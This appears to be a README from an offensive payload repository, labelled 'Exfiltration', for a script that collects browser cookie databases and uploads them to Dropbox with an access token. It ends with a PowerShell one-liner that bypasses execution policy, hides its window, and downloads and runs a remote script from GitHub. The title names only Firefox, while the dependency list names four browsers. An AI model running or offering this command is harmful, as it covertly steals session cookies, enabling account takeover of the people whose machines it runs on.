# Export Firefox Cookies Database

This script may come in handy for those who want to quickly save all the cookies of their Browsers session by exporting the database via dropbox accesstoken.

**Category**: Exfiltration

<div align=center>

<img src="/main/img/logo-repository-2_0.gif" width="600" /><br>
<img src="/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

This script may come in handy for those who want to quickly save all the cookies of their Browsers session by exporting the database via dropbox accesstoken.

Open a PowerShell, select dynamically the Firefox path adding "browserName_cookies.sqlite" at the end, then set your exfiltration settings i.e. Dropbox access token and so on... then export it, then close the powershell.

## Dependencies

* Firefox must be installed
* Edge must be installed
* Chrome must be installed
* Opera must be installed


All
```powershell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Exfilaration/ExportCookiesBrowsers/exportCookies.ps1').Content"
```
